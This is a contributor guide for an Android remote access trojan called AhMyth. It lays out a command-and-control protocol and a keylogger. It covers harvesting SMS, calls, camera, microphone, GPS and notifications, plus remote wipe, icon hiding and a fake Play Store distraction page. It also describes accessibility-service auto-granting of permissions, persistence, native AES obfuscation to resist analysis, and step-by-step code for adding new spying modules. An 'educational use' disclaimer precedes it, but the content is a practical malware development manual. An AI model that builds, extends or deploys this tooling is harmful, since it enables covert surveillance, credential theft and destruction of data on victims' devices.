# Contributing to AhMyth Client

> **⚠️ Ethical Use:** This project is designed for **educational and authorized testing purposes only**. Contributors must ensure their work is used responsibly. Contributions that enable unlawful surveillance or device compromise without consent will be rejected.

---

## 📖 Table of Contents

1. [Project Overview](#-project-overview)
2. [Architecture Deep Dive](#-architecture-deep-dive)
3. [Codebase Organization](#-codebase-organization)
4. [Development Setup](#-development-setup)
5. [C2 Protocol Specification](#-c2-protocol-specification)
6. [AES String Obfuscation Guide](#-aes-string-obfuscation-guide)
7. [Native NDK Library Guide](#-native-ndk-library-guide)
8. [Adding a New Command / Manager Module](#-adding-a-new-command--manager-module)
9. [Modifying the C2 Dashboard](#-modifying-the-c2-dashboard)
10. [Testing Guidelines](#-testing-guidelines)
11. [Code Style Guide](#-code-style-guide)
12. [Pull Request Process](#-pull-request-process)
13. [Known Issues & Roadmap](#-known-issues--roadmap)

---

## 🏗 Architecture Deep Dive

### High-Level Data Flow

```
┌──────────┐                    ┌──────────────────────────────┐
│ C2 Server │  Socket.IO/FCM    │      Android App              │
│ (Node.js) │ ←──────────────→ │                              │
│           │   "order" event   │  ┌────────────────────────┐  │
│  ┌──────┐ │   "x0000*" resp   │  │   ConnectionManager    │  │
│  │Dash- │ │                    │  │  dispatchOrder()       │  │
│  │board │ │                    │  │  if-else chain via     │  │
│  └──────┘ │                    │  │  ObfuscationUtils      │  │
└──────────┘                    │  │  .matches()             │  │
                                │  └──────┬─────────────────┘  │
                                │         ↕                     │
                                │  ┌──────┴─────────────────┐  │
                                │  │   Manager Modules (10) │  │
                                │  │   Camera, SMS, GPS,    │  │
                                │  │   Mic, Files, Calls,   │  │
                                │  │   Contacts, Apps,      │  │
                                │  │   Screen, Keylogger    │  │
                                │  └────────────────────────┘  │
                                │                              │
                                │  ┌────────────────────────┐  │
                                │  │   ObfuscationUtils     │  │
                                │  │   (native .so via JNI) │  │
                                │  │   AES-128-ECB decrypt  │  │
                                │  └────────────────────────┘  │
                                └──────────────────────────────┘
```

### Component Responsibilities

| Layer | Component | File | Responsibility |
|-------|-----------|------|---------------|
| **Entry** | `MainActivity` | `MainActivity.java` | Permission requests, Device Admin activation, icon hiding, service launch |
| **Service** | `MainService` | `MainService.java` | Foreground service lifecycle, notification, wake lock, connection init |
| **Network** | `IOSocket` | `IOSocket.java` | Socket.IO client singleton, reconnection config, URL construction |
| **Dispatch** | `ConnectionManager` | `ConnectionManager.java` | Event listener, if-else dispatch via ObfuscationUtils.matches() |
| **Obfuscation** | `ObfuscationUtils` | `ObfuscationUtils.java` | AES-128-ECB decrypt via JNI — key exists only in .so |
| **Native** | `obfuscation_jni.c` | `src/main/jni/obfuscation_jni.c` | JNI bridge: nativeDecrypt, nativeMatches |
| **Native** | `aes.c` | `src/main/jni/aes.c` | Standalone AES-128 implementation (zero deps) |
| **Manager** | `XxxManager` | `helpers/XxxManager.*` | Android API calls for each capability |
| **Stealth** | `KeyloggerService` | `KeyloggerService.java` | AccessibilityService: keystrokes, auto-grant, overlay, clipboard |
| **Stealth** | `NotificationService` | `NotificationService.java` | NotificationListenerService — reads all notifications |
| **Stealth** | `FcmMessageService` | `FcmMessageService.java` | Firebase data message handler for stealth C2 trigger |
| **Persistence** | `MyReceiver` | `receivers/MyReceiver.java` | Boot/SMS/outgoing-call broadcast receiver |
| **Persistence** | `AdminReceiver` | `receivers/AdminReceiver.java` | Device Admin grant receiver |
| **Persistence** | `RestartServiceWorker` | `workers/RestartServiceWorker.kt` | WorkManager periodic restart (15 min) |

### Lifecycle Sequence

```
App Launched
    ↓
MainActivity.onCreate()
    ├── Request Device Admin
    ├── Request 13+ runtime permissions
    ├── Request Screen Capture (MediaProjection)
    ├── Request Overlay + Storage permissions
    ├── Request Notification Listener access
    ├── Request Accessibility Service enable
    ├── Request Battery Optimization bypass
    ├── Schedule WorkManager restarter (15 min)
    ├── Start MainService (foreground)
    ├── Open fake Google Play Settings page (distraction)
    └── Hide launcher icon + finish activity
            ↓
MainService.onStartCommand()
    ├── Create notification channel
    ├── Show persistent notification
    ├── Acquire partial wake lock
    ├── Store application context
    └── Call ConnectionManager.startAsync()
            ↓
ConnectionManager.sendReq()
    ├── Create/reuse IOSocket singleton (URL decrypted at runtime)
    ├── Register "ping" → "pong" handler
    ├── Register "order" → dispatchOrder() dispatcher
    └── socket.connect()
            ↓
    [Await commands from C2 server (Socket.IO) or FCM trigger]
            ↓
On "order" event (decrypted via ObfuscationUtils.nativeDecrypt):
    if (ObfuscationUtils.matches(ENC_X0000CA, order)) → CameraManager
    else if (ObfuscationUtils.matches(ENC_X0000FM, order)) → FileManager
    else if (ObfuscationUtils.matches(ENC_X0000SM, order)) → SMSManager
    ...
    else if (ObfuscationUtils.matches(ENC_X0000KL, order)) → KeyloggerService
```

---

## 📁 Codebase Organization

```
AhMyth-Google-Play-Service-Client/
├── .freebuff/                          # Demo tools & documentation
│   ├── ahmyth-visual-explanation.html  # Interactive architecture diagram
│   ├── c2-server.js                    # Node.js C2 server with Socket.IO + FCM
│   ├── c2-dashboard.html               # Web-based C2 dashboard with GPS map
│   ├── index.html                      # GitHub Pages landing page
│   ├── FCM_SETUP.md                    # Firebase Cloud Messaging setup guide
│   ├── run.md                          # Local preview run doc
│   └── generate-encrypted-bytes.js     # AES encrypted byte array generator
│
├── .github/workflows/
│   ├── build.yml                       # CI: lint, test, build APK
│   └── deploy-pages.yml                # CD: deploy .freebuff/ to GitHub Pages
│
├── app/
│   ├── build.gradle                    # App build config + SOCKET_URL + NDK
│   ├── proguard-rules.pro              # Aggressive obfuscation rules
│   ├── google-services.json            # Firebase config (create per Firebase project)
│   ├── src/main/
│   │   ├── AndroidManifest.xml         # Permissions, services, receivers
│   │   ├── java/com/android/background/services/
│   │   │   ├── MainActivity.java       # Entry point + permission flow
│   │   │   ├── MainService.java        # Foreground service
│   │   │   ├── ConnectionManager.java  # Command dispatch (if-else chains)
│   │   │   ├── IOSocket.java           # Socket.IO singleton
│   │   │   ├── ObfuscationUtils.java   # AES decrypt via JNI native methods
│   │   │   ├── KeyloggerService.java   # AccessibilityService (keylogger)
│   │   │   ├── NotificationService.java # Notification listener
│   │   │   ├── FcmMessageService.java  # Firebase data message handler
│   │   │   ├── helpers/
│   │   │   │   ├── CameraManager.java
│   │   │   │   ├── MicManager.java
│   │   │   │   ├── LocManager.kt
│   │   │   │   ├── SMSManager.kt
│   │   │   │   ├── CallsManager.java
│   │   │   │   ├── ContactsManager.java
│   │   │   │   ├── FileManager.kt
│   │   │   │   ├── ScreenManager.java
│   │   │   │   └── AppsListManager.java
│   │   │   ├── receivers/
│   │   │   │   ├── AdminReceiver.java
│   │   │   │   └── MyReceiver.java
│   │   │   └── workers/
│   │   │       └── RestartServiceWorker.kt
│   │   ├── jni/                        # Native AES-128 library
│   │   │   ├── CMakeLists.txt          # CMake build (4 ABIs)
│   │   │   ├── aes.h                   # AES header
│   │   │   ├── aes.c                   # Standalone AES-128 (public domain)
│   │   │   └── obfuscation_jni.c       # JNI bridge
│   │   └── res/
│   │       ├── xml/
│   │       │   ├── device_admin.xml
│   │       │   └── accessibility_service_config.xml
│   │       └── values/strings.xml
│   ├── test/                           # Unit tests
│   └── androidTest/                    # Instrumentation tests
│
├── build.gradle                        # Project-level Gradle config
├── settings.gradle
├── gradle.properties
├── gradlew / gradlew.bat
├── README.md                           # Project overview & demo guide
├── CONTRIBUTING.md                     # This file
├── DEPLOYMENT.md                       # Deployment guide
└── .gitignore
```

---

## 🔧 Development Setup

### Prerequisites

| Tool | Version | Notes |
|------|---------|-------|
| Android Studio | Hedgehog 2023.1+ | Download from developer.android.com |
| JDK | 17 | Included with Android Studio |
| Android SDK | 34 (compileSdk), 21 (minSdk) | SDK Manager in Android Studio |
| Android NDK | 28.2+ | Required for native AES library (SDK Manager → SDK Tools) |
| CMake | 3.22.1+ | Bundled with NDK |
| Node.js | 18+ | For the C2 dashboard server |
| Android Device | 7.0+ (API 24) | Emulator or physical device |

### First-Time Build

```bash
# 1. Clone
git clone https://github.com/IamAzmathullaShaikh/AhMyth-Google-Play-Service-Client.git
cd AhMyth-Google-Play-Service-Client

# 2. Open in Android Studio (let Gradle sync complete)
#    File → Open → select project directory

# 3. Configure C2 server URL
#    Edit app/build.gradle → change SOCKET_URL to your server IP

# 4. Build the APK (includes native .so for all 4 ABIs)
./gradlew assembleDebug

# 5. Install on device
adb install app/build/outputs/apk/debug/app-debug.apk
```

### Running the C2 Dashboard

```bash
cd .freebuff
npm install socket.io express

# For FCM support, also install Firebase Admin SDK:
# npm install firebase-admin
# See FCM_SETUP.md for Firebase project configuration

node c2-server.js
# Dashboard: http://localhost:42474
```

### Android Studio NDK Configuration

If this is your first time building with NDK:

1. **Tools → SDK Manager → SDK Tools tab**
2. Check **NDK (Side by side)** and **CMake**
3. Click **Apply** to download
4. After installation, verify NDK path in `local.properties`:
   ```
   ndk.dir=C\:\\Users\\<USER>\\AppData\\Local\\Android\\Sdk\\ndk\\28.2.13676358
   ```

---

## 📡 C2 Protocol Specification

### Transport

- **Protocol:** Socket.IO (WebSocket with HTTP long-polling fallback)
- **Stealth Channel:** Firebase Cloud Messaging (FCM) data messages trigger brief connections
- **Library:** `io.socket:socket.io-client:2.0.1` (Android), `socket.io` npm package (server)
- **Port:** 42474 (default, configurable)
- **Format:** JSON over named events

### Connection URL

All URL components are AES-encrypted at rest and decrypted at runtime via `ObfuscationUtils`:

```
ws://<SERVER>:<PORT>/?model=<MODEL>&manf=<MANUFACTURER>&release=<ANDROID_VERSION>&id=<ANDROID_ID>
```

| Parameter | Source | Example |
|-----------|--------|---------|
| `model` | `Build.MODEL` | `Pixel_6` |
| `manf` | `Build.MANUFACTURER` | `Google` |
| `release` | `Build.VERSION.RELEASE` | `14` |
| `id` | `Settings.Secure.ANDROID_ID` | `ABCDEF1234567890` |

### Keep-Alive

- Server sends `"ping"` event (standard Socket.IO heartbeat)
- Client responds with `"pong"` event
- Socket.IO transport-level: pingInterval: 25s, pingTimeout: 60s

### Command Format (Server → Client)

```json
{
  "order": "<opcode>",
  "extra": "<subcommand>",
  "path": "/storage/emulated/0",
  "sec": 5,
  "url": "https://...",
  "number": "+1234567890",
  "to": "+1234567890",
  "sms": "Hello",
  "fileFolderPath": "/path/to/file",
  "action": "<keylogger_action>",
  "state": true
}
```

### Response Format (Client → Server)

Each manager emits its response on the **same event name** as the command:

```json
// Generic success response
{ "status": true, "message": "Action completed." }

// Data responses:
{ "smsList": [{ "phoneNo": "...", "msg": "..." }] }
{ "callsList": [{ "phoneNo": "...", "name": "...", "duration": "123", "type": 1 }] }
{ "contactsList": [{ "phoneNo": "...", "name": "..." }] }
{ "enable": true, "lat": 37.7749, "lng": -122.4194 }
{ "appsList": [{ "appName": "...", "packageName": "...", "versionName": "..." }] }

// Keylogger data (batched):
{
  "events": [
    { "type": "text", "text": "password123", "hint": "Password", "package": "com.example" },
    { "type": "tap", "center_x": 540, "center_y": 920, "text": "Send" },
    { "type": "window", "package": "com.example" },
    { "type": "auto_grant", "package": "com.android.packageinstaller" }
  ],
  "count": 4,
  "from": "com.example",
  "ts": 1700000000000
}
```

### Complete Opcode Table

| Opcode | Direction | Function | Module |
|--------|-----------|----------|--------|
| `x0000ca` | Bidirectional | Camera capture / list response | CameraManager |
| `x0000fm` | Bidirectional | File manager ls / download | FileManager |
| `x0000sm` | Bidirectional | SMS list / send | SMSManager |
| `x0000cl` | Bidirectional | Call logs | CallsManager |
| `x0000cn` | Bidirectional | Contacts | ContactsManager |
| `x0000mc` | Server→Client | Microphone recording | MicManager |
| `x0000apps` | Bidirectional | Installed apps list | AppsListManager |
| `x0000lm` | Bidirectional | GPS location | LocManager |
| `x0000sc` | Server→Client | Screen capture | ScreenManager |
| `x0000runApp` | Server→Client | Launch app by package | ConnectionManager |
| `x0000openUrl` | Server→Client | Open URL in browser | ConnectionManager |
| `x0000deleteFF` | Server→Client | Delete file/folder | ConnectionManager |
| `x0000dm` | Server→Client | Dial phone number | ConnectionManager |
| `x0000lockDevice` | Bidirectional | Lock device (Device Admin) | ConnectionManager |
| `x0000wipeDevice` | Bidirectional | Factory reset (Device Admin) | ConnectionManager |
| `x0000rebootDevice` | Bidirectional | Reboot device (Device Admin) | ConnectionManager |
| `x0000kl` | Bidirectional | Keylogger control & data | KeyloggerService |
| `x0000kldata` | Client→Server | Keylogger batched event data | KeyloggerService |
| `x0000nt` | Client→Server only | Notification exfiltration | NotificationService |

**Keylogger actions (via `x0000kl`):**

| Action | Description | Payload |
|--------|-------------|---------|
| `enable` / `disable` | Toggle keystroke capture | `{ action: "enable" }` |
| `enableWithOverlay` | Enable + transparent tap overlay | `{ action: "enableWithOverlay" }` |
| `flush` | Flush buffered keystrokes immediately | `{ action: "flush" }` |
| `getStatus` | Return keylogger status | `{ action: "getStatus" }` |
| `getClipboard` | Read clipboard content | `{ action: "getClipboard" }` |
| `overlay` | Toggle transparent tap overlay | `{ action: "overlay", state: true }` |
| `unlockScreen` | Wake + unlock device screen | `{ action: "unlockScreen" }` |
| `autoGrant` | Toggle auto-grant permission | `{ action: "autoGrant", state: true }` |

### FCM Channel

When configured, commands can be sent via Firebase push instead of persistent Socket.IO:

1. Dashboard sends command to `POST /api/fcm/push`
2. Server pushes a silent FCM data message to the device
3. `FcmMessageService.onMessageReceived()` fires
4. Device briefly connects to Socket.IO (~2s), executes command, disconnects

See [FCM_SETUP.md](.freebuff/FCM_SETUP.md) for Firebase configuration.

---

## 🔐 AES String Obfuscation Guide

All C2 opcodes, JSON keys, and Socket.IO URL components are AES-128-ECB encrypted at rest and decrypted at runtime. The decryption happens in native C code (via NDK .so library).

### How It Works

```
Java bytecode (.dex)              Native library (.so)
┌────────────────────────┐       ┌──────────────────────┐
│ ENC_X0000SM = {        │       │  XOR-obfuscated key  │
│   4, -62, 33, 57, ...} │  JNI  │  → real_key[16]      │
│                        │──────→│  AES-128 key_expand  │
│ nativeDecrypt(         │       │  aes128_decrypt_block│
│   ENC_X0000SM)         │←──────│  PKCS7 unpadding    │
│    → "x0000sm"         │       └──────────────────────┘
└────────────────────────┘
```

### Adding New Encrypted Strings

1. Add the new plaintext string to `.freebuff/generate-encrypted-bytes.js`
2. Run: `node .freebuff/generate-encrypted-bytes.js`
3. Copy the output `ENC_*` constant into `ObfuscationUtils.java`
4. Replace the raw string literal with `ObfuscationUtils.decrypt(ObfuscationUtils.ENC_XXX)` or `ObfuscationUtils.matches(ObfuscationUtils.ENC_XXX, order)`
5. Rebuild: `./gradlew assembleDebug` (CMake recompiles native lib automatically)

### Important Rules

- **Switch-case labels** cannot use runtime-decrypted strings (Java requires compile-time constants). Use if-else chains with `ObfuscationUtils.matches()` instead.
- **The AES key** is XOR-obfuscated in native C code (`obfuscation_jni.c`). The plain key never appears in the DEX.
- **Stack buffers** (round keys, blocks) are `memset(0)` after use in native code.
- **Thread safety** is handled via `pthread_once` for one-time key initialization.

---

## 🏛 Native NDK Library Guide

### Architecture

```
CMakeLists.txt
    → compiles aes.c + obfuscation_jni.c
    → produces libobfuscation_native.so
    → for 4 ABIs: arm64-v8a, armeabi-v7a, x86, x86_64
```

The native library (`~3 KB`) contains:
- **`aes.c`:** Standalone AES-128 decryption (zero external dependencies)
  - S-Box / InvS-Box lookup tables
  - GF(2^8) multiplication helpers
  - Key expansion (16 → 176 bytes)
  - Decrypt: InvShiftRows, InvSubBytes, AddRoundKey, InvMixColumns (10 rounds)
- **`obfuscation_jni.c`:** JNI bridge
  - `nativeDecrypt(byte[]) → String`
  - `nativeMatches(byte[], String) → boolean`
  - XOR-obfuscated AES key recovery via `pthread_once`

### Modifying the Native Library

1. Edit files in `app/src/main/jni/`
2. Rebuild: `./gradlew assembleDebug` — CMake detects changes automatically
3. To debug: check `app/build/outputs/cmake/` for compiled `.so` files per ABI

### Compiler Flags

| Flag | Purpose |
|------|---------|
| `-Os` | Optimize for size |
| `-fvisibility=hidden` | Hide internal symbols |
| `-ffunction-sections` | Enable GC of unused sections |
| `-Wl,--gc-sections` | Strip unused code at link time |
| `-s` | Strip symbol table (minimizes .so size) |

---

## ➕ Adding a New Command / Manager Module

### Step 1: Choose an opcode and generate encrypted bytes

Use the pattern `x0000XX`. Add the new opcode to `.freebuff/generate-encrypted-bytes.js` and run it to produce the encrypted byte array.
Add the `ENC_X0000XX` constant to `ObfuscationUtils.java`.

### Step 2: Create the Manager class

```java
package com.android.background.services.helpers;

import com.android.background.services.IOSocket;
import com.android.background.services.ObfuscationUtils;
import org.json.JSONObject;

public class ExampleManager {
    public static void performAction(String parameter) {
        try {
            JSONObject result = new JSONObject();
            result.put("status", true);
            result.put("data", "Result");
            // Emit response on the encrypted opcode
            IOSocket.getInstance().getIoSocket()
                .emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000XX), result);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### Step 3: Add the dispatch case in ConnectionManager

Add an if-else branch in `ConnectionManager.dispatchOrder()`:

```java
} else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000XX, order)) {
    ExampleManager.performAction(data.optString(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_EXTRA)));
```

### Step 4: Add Android permission (if needed)

- Add `<uses-permission>` to `AndroidManifest.xml`
- Add to `MainActivity.getRequiredPermissions()` if runtime grant needed

### Step 5: Add dashboard button

In `c2-dashboard.html`, add a button:

```html
<button class="cmd-btn" onclick="sendCmd('x0000xx','')">
  <span class="icon">🔧</span> My Command
</button>
```

### Step 6: Add server forwarding

In `c2-server.js`, add the event to `dataEvents` array:

```javascript
const dataEvents = [...existing..., 'x0000xx'];
```

### Step 7: Add native decrypt (if using the string as a socket emit name)

The encrypted byte array must exist in `ObfuscationUtils.java`. Use `decrypt()` for emit names or `matches()` for if-else comparisons.

---

## 🖥 Modifying the C2 Dashboard

### Architecture

The dashboard is a **single HTML file** (`.freebuff/c2-dashboard.html`) that:
- Connects via Socket.IO (CDN-loaded `socket.io.min.js`)
- Displays devices from `devices:update` events
- Sends commands via `command:send` events
- Receives responses via `device:response` events
- Uses Leaflet.js for GPS map (CDN-loaded)
- Supports FCM mode toggle (HTTP push fallback)

### Socket.IO Events (Dashboard ↔ Server)

| Event | Direction | Payload |
|-------|-----------|---------|
| `devices:update` | Server → Dashboard | `[{socketId, model, manufacturer, androidVersion, deviceId, connectedAt, channel}]` |
| `command:send` | Dashboard → Server | `{targetSocketId, command, useFcm}` |
| `command:sent` | Server → Dashboard | `{targetSocketId, command, channel, timestamp}` |
| `command:error` | Server → Dashboard | `{message, targetSocketId}` |
| `device:response` | Server → Dashboard | `{socketId, deviceInfo, event, data, timestamp}` |
| `fcm:status` | Server → Dashboard | `{available, devices}` |

### Keylogger Live Feed

The dashboard has a dedicated **live keystroke feed** section that shows:

- `⌨️ text` — Captured text input with field hint
- `👆 tap` — View click events with coordinates
- `🎯 focus` — Field focus events
- `🪟 window` — App window transitions
- `✅ auto_grant` — Auto-granted permissions
- `🖱 overlay_tap` — Transparent overlay touch events
- `📋 clipboard` — Clipboard content reads

The feed updates in real-time from `x0000kldata` events and maintains a buffer of 50 entries.

---

## 🧪 Testing Guidelines

### Unit Tests

```bash
# Unit tests
./gradlew testDebugUnitTest

# Instrumentation tests (requires device/emulator)
./gradlew connectedDebugAndroidTest

# Android lint
./gradlew lintDebug

# All checks
./gradlew check
```

### Manual Testing Checklist

- [ ] App builds: `./gradlew assembleDebug`
- [ ] Native library compiles: check `app/build/outputs/apk/debug/` contains `libobfuscation_native.so`
- [ ] App installs and starts on API 24+ device/emulator
- [ ] Permission flow completes (13+ permissions)
- [ ] Socket.IO connection establishes
- [ ] Each command fires and returns data
- [ ] Dashboard receives and displays responses
- [ ] Keylogger toggles on/off and shows keystrokes in feed
- [ ] GPS location plots on interactive map
- [ ] FCM push (if configured) triggers command execution
- [ ] Device rotation doesn't crash
- [ ] Service restarts after process kill (persistence)

---

## 🎨 Code Style Guide

### Java

- **Target:** Java 17 language features
- **Braces:** Egyptian style (opening brace on same line)
- **Indentation:** 4 spaces, no tabs
- **Imports:** No wildcard imports, organize: Android → Java → Third-party
- **Null safety:** Use `@Nullable`/`@NonNull` annotations
- **Error handling:** `Log.e()` for production; avoid `e.printStackTrace()`
- **Obfuscated strings:** Always use `ObfuscationUtils.decrypt()` or `ObfuscationUtils.matches()` — never raw opcode literals
- **JNI naming:** Follow `Java_<package>_<class>_<method>` convention exactly

### Kotlin

- **Target:** Kotlin 1.9+
- **Null safety:** Prefer `?` and `?:` over `!!`
- **Functions:** Expression bodies for simple functions
- **Constants:** Use `const val` for compile-time constants

### Naming Conventions

| Element | Convention | Example |
|---------|-----------|---------|
| Classes | PascalCase | `CameraManager`, `MainService` |
| Methods | camelCase | `sendReq()`, `getCallsLogs()` |
| Constants | UPPER_SNAKE_CASE | `MAX_RECONNECT_ATTEMPTS` |
| Encrypted bytes | `ENC_X0000XX` | `ENC_X0000SM` |
| Opcodes (comments) | Lowercase | `x0000ca`, `x0000fm` |
| Layout files | snake_case | `activity_main.xml` |
| C functions | snake_case | `aes128_decrypt_block` |

---

## 🔄 Pull Request Process

1. **Fork** the repository and create a feature branch from `modernization-and-persistence`
2. **Name your branch:** `feat/<description>`, `fix/<description>`, or `docs/<description>`
3. **Make focused commits** — each commit = one logical change
4. **Write descriptive commit messages:**
   ```
   <type>: <brief description>

   <detailed explanation of what and why>
   ```
5. **Update documentation** if you add/modify commands, protocol, dashboard, or build config
6. **Run the build** to verify compilation (Java + native)
7. **Run existing tests** to ensure nothing is broken
8. **Create a Pull Request** with clear description and testing done

### PR Checklist

- [ ] Code compiles without errors (`./gradlew assembleDebug`)
- [ ] Native library compiles (check `libobfuscation_native.so` in APK)
- [ ] New tests pass (if applicable)
- [ ] Existing tests still pass
- [ ] Documentation updated (README, CONTRIBUTING, opcode table)
- [ ] No hardcoded secrets or PII in commits
- [ ] If adding strings to ObfuscationUtils, regenerated encrypted bytes
- [ ] Opcode table updated in CONTRIBUTING.md
- [ ] PR description explains what and why

---

## 🗺 Known Issues & Roadmap

### Current Limitations

| Issue | Impact | Status |
|-------|--------|--------|
| Deprecated `Camera` API instead of `Camera2` | May fail on Android 14+ | Needs migration |
| No TLS/WSS support | Traffic is cleartext | Needs server cert |
| Single C2 server hardcoded at build time | Can't switch without rebuild | Consider runtime QR |
| `FileManager.downloadFile()` reads entire file | OOM on huge files | Partially fixed (20MB limit) |
| No auth between dashboard and server | Anyone on network can send commands | Acceptable for demo |
| Screen capture requires user consent dialog | Can't bypass | Android security limit |
| `matchesIgnoreCase` uses Java heap comparison | Exposes decrypted string briefly | Add JNI method |
| No native lib load fallback | Crash if .so can't load | Add try/catch fallback |

### Future Roadmap

| Priority | Feature | Effort |
|----------|---------|--------|
| P0 | Camera2 API migration | 2-3 days |
| P1 | Debug Dashboard Activity (offline demo) | 2 days |
| P1 | QR code server URL config | 1 day |
| P1 | Frida detection + anti-analysis checks | 2 days |
| P2 | Full Kotlin migration | 3-4 days |
| P2 | Multi-device timeline view | 2 days |
| P3 | Inline camera photo viewer | 4 hours |
| P3 | WiFi network scanner | 1 day |
| P3 | CLI tool for encrypted byte generation | 1 day |
| P4 | Multi-server failover | 2 days |
| P4 | Docker deployment for C2 server | 4 hours |
